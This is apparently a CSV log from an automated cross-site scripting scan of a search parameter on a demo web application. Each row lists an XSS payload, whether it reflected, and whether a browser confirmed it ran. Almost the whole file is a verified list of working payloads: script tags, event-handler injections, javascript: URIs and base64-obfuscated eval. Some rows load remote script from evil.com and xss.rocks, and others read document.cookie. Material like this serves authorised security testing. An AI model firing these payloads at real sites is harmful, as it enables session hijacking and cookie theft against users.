Payload_Start_Time,Payload_End_Time,Duration_Seconds,Target_URL,HTTP_Method,Parameter,Payload,Reflection_Type,Browser_Verified,XSS_Event_Type,Severity
2026-01-10 16:58:42.593,2026-01-10 16:58:43.361,0.768,https://demo-knsl.onrender.com/search,GET,q,<script>prompt(1)</script>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:58:42.593,2026-01-10 16:58:43.390,0.797,https://demo-knsl.onrender.com/search,GET,q,<script>alert(window.origin)</script>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:58:42.593,2026-01-10 16:58:43.391,0.798,https://demo-knsl.onrender.com/search,GET,q,"<script>alert(""XSS"")</script>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:58:42.593,2026-01-10 16:58:43.391,0.798,https://demo-knsl.onrender.com/search,GET,q,<script>alert(1)</script>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:58:42.593,2026-01-10 16:58:43.417,0.824,https://demo-knsl.onrender.com/search,GET,q,<script src=https://evil.com/xss.js></script>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:58:42.593,2026-01-10 16:58:43.417,0.824,https://demo-knsl.onrender.com/search,GET,q,<script>confirm(1)</script>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:58:42.593,2026-01-10 16:58:43.418,0.825,https://demo-knsl.onrender.com/search,GET,q,<script>alert(document.cookie)</script>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:58:43.391,2026-01-10 16:58:43.496,0.104,https://demo-knsl.onrender.com/search,GET,q,<svg><animate onbegin=alert(1) attributeName=x dur=1s>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:58:42.593,2026-01-10 16:58:43.794,1.201,https://demo-knsl.onrender.com/search,GET,q,<script>alert('XSS')</script>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:58:43.391,2026-01-10 16:58:43.797,0.405,https://demo-knsl.onrender.com/search,GET,q,<svg><script>alert(1)</script></svg>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:58:42.593,2026-01-10 16:58:43.797,1.204,https://demo-knsl.onrender.com/search,GET,q,<script>alert(document.domain)</script>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:58:43.361,2026-01-10 16:58:43.797,0.435,https://demo-knsl.onrender.com/search,GET,q,<svg/onload=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:58:43.390,2026-01-10 16:58:43.799,0.409,https://demo-knsl.onrender.com/search,GET,q,<svg onload=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:58:43.418,2026-01-10 16:58:43.801,0.383,https://demo-knsl.onrender.com/search,GET,q,<svg onload=confirm(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:58:43.417,2026-01-10 16:58:43.803,0.386,https://demo-knsl.onrender.com/search,GET,q,"<svg/onload=alert(String.fromCharCode(88,83,83))>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:58:43.417,2026-01-10 16:58:43.803,0.385,https://demo-knsl.onrender.com/search,GET,q,<svg onload=prompt(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:58:43.496,2026-01-10 16:58:43.959,0.464,https://demo-knsl.onrender.com/search,GET,q,<svg onload=alert`1`>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:58:43.801,2026-01-10 16:58:43.964,0.163,https://demo-knsl.onrender.com/search,GET,q,<img src=x onerror=alert('XSS')>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:58:43.794,2026-01-10 16:58:44.075,0.280,https://demo-knsl.onrender.com/search,GET,q,<svg onload=eval(atob('YWxlcnQoMSk='))>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:58:43.803,2026-01-10 16:58:44.079,0.276,https://demo-knsl.onrender.com/search,GET,q,<img src=x onerror=eval(atob('YWxlcnQoMSk='))>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:58:43.799,2026-01-10 16:58:44.176,0.377,https://demo-knsl.onrender.com/search,GET,q,<img src=x onerror=confirm(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:58:43.797,2026-01-10 16:58:44.181,0.384,https://demo-knsl.onrender.com/search,GET,q,<img src=x onerror=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:58:42.593,2026-01-10 16:58:44.184,1.591,https://demo-knsl.onrender.com/search,GET,q,<script src=//xss.rocks/xss.js></script>,RAW_REFLECTION,No,,High
2026-01-10 16:58:43.797,2026-01-10 16:58:44.184,0.388,https://demo-knsl.onrender.com/search,GET,q,<img src=x onerror=prompt(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:58:44.079,2026-01-10 16:58:44.191,0.112,https://demo-knsl.onrender.com/search,GET,q,<img src='x' onerror='alert(1)'>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:58:43.803,2026-01-10 16:58:44.214,0.412,https://demo-knsl.onrender.com/search,GET,q,<img src=x onerror=alert`1`>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:58:43.797,2026-01-10 16:58:44.220,0.424,https://demo-knsl.onrender.com/search,GET,q,<svg><script>alert&#40;1&#41;</script>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:58:44.184,2026-01-10 16:58:44.300,0.116,https://demo-knsl.onrender.com/search,GET,q,<body onfocus=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:58:44.176,2026-01-10 16:58:44.300,0.124,https://demo-knsl.onrender.com/search,GET,q,<body onload=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:58:43.959,2026-01-10 16:58:44.434,0.474,https://demo-knsl.onrender.com/search,GET,q,<img src=x onerror=alert(document.cookie)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:58:43.964,2026-01-10 16:58:44.437,0.473,https://demo-knsl.onrender.com/search,GET,q,<img/src=x onerror=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:58:44.181,2026-01-10 16:58:44.437,0.257,https://demo-knsl.onrender.com/search,GET,q,<body onpageshow=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:58:44.184,2026-01-10 16:58:44.445,0.260,https://demo-knsl.onrender.com/search,GET,q,<body onhashchange=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:58:44.075,2026-01-10 16:58:44.445,0.370,https://demo-knsl.onrender.com/search,GET,q,"<img src=""x"" onerror=""alert(1)"">",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:58:44.214,2026-01-10 16:58:44.448,0.234,https://demo-knsl.onrender.com/search,GET,q,<body onload=confirm(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:58:44.300,2026-01-10 16:58:44.453,0.153,https://demo-knsl.onrender.com/search,GET,q,<input type=text value=x onfocus=alert(1) autofocus>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:58:44.191,2026-01-10 16:58:44.461,0.270,https://demo-knsl.onrender.com/search,GET,q,<body onload=prompt(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:58:44.434,2026-01-10 16:58:44.497,0.063,https://demo-knsl.onrender.com/search,GET,q,<input type=button value=xss onclick=alert(1)>,NO_REFLECTION,No,,Info
2026-01-10 16:58:44.220,2026-01-10 16:58:44.669,0.449,https://demo-knsl.onrender.com/search,GET,q,<input onfocus=alert(1) autofocus>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:58:44.445,2026-01-10 16:58:44.679,0.234,https://demo-knsl.onrender.com/search,GET,q,"<iframe src=""javascript:alert(1)"">",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:58:44.445,2026-01-10 16:58:44.682,0.237,https://demo-knsl.onrender.com/search,GET,q,<iframe onload=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:58:44.437,2026-01-10 16:58:44.683,0.246,https://demo-knsl.onrender.com/search,GET,q,<iframe src=javascript:alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:58:44.448,2026-01-10 16:58:44.684,0.236,https://demo-knsl.onrender.com/search,GET,q,<iframe/onload=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:58:44.461,2026-01-10 16:58:44.691,0.231,https://demo-knsl.onrender.com/search,GET,q,'-alert(1)-',RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:58:44.679,2026-01-10 16:58:44.735,0.056,https://demo-knsl.onrender.com/search,GET,q,<details open ontoggle=prompt(1)>,NO_REFLECTION,No,,Info
2026-01-10 16:58:44.669,2026-01-10 16:58:44.773,0.104,https://demo-knsl.onrender.com/search,GET,q,<details ontoggle=alert(1)><summary>xss</summary></details>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:58:44.437,2026-01-10 16:58:44.781,0.344,https://demo-knsl.onrender.com/search,GET,q,<input type=image src=x onerror=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:58:44.683,2026-01-10 16:58:44.799,0.116,https://demo-knsl.onrender.com/search,GET,q,<embed src=javascript:alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:58:44.691,2026-01-10 16:58:44.802,0.111,https://demo-knsl.onrender.com/search,GET,q,<select onfocus=alert(1) autofocus>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:58:44.682,2026-01-10 16:58:44.806,0.124,https://demo-knsl.onrender.com/search,GET,q,<object data=javascript:alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:58:44.497,2026-01-10 16:58:44.816,0.319,https://demo-knsl.onrender.com/search,GET,q,<details open ontoggle=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:58:44.735,2026-01-10 16:58:44.848,0.113,https://demo-knsl.onrender.com/search,GET,q,<textarea onfocus=alert(1) autofocus>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:58:44.781,2026-01-10 16:58:44.882,0.101,https://demo-knsl.onrender.com/search,GET,q,<marquee onstart=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:58:44.773,2026-01-10 16:58:44.894,0.121,https://demo-knsl.onrender.com/search,GET,q,<keygen onfocus=alert(1) autofocus>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:58:44.816,2026-01-10 16:58:44.912,0.097,https://demo-knsl.onrender.com/search,GET,q,<video><source onerror=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:58:44.806,2026-01-10 16:58:44.915,0.109,https://demo-knsl.onrender.com/search,GET,q,<audio src=x onerror=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:58:44.802,2026-01-10 16:58:44.921,0.119,https://demo-knsl.onrender.com/search,GET,q,<video src=x onerror=alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:58:44.684,2026-01-10 16:58:44.948,0.264,https://demo-knsl.onrender.com/search,GET,q,"<object data=""data:text/html,<script>alert(1)</script>"">",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:58:44.848,2026-01-10 16:58:44.954,0.106,https://demo-knsl.onrender.com/search,GET,q,<link rel=stylesheet href=javascript:alert(1)>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:58:44.894,2026-01-10 16:58:45.019,0.125,https://demo-knsl.onrender.com/search,GET,q,"<a href=""javascript:alert(1)"">click</a>",RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:58:44.912,2026-01-10 16:58:45.026,0.113,https://demo-knsl.onrender.com/search,GET,q,<form action=javascript:alert(1)><input type=submit>,RAW_REFLECTION,Yes,alert,Critical
2026-01-10 16:58:44.921,2026-01-10 16:58:45.029,0.108,https://demo-knsl.onrender.com/search,GET,q,<form><input formaction=javascript:alert(1) type=submit value=X>,RAW_REFLECTION,Yes,alert,Critical
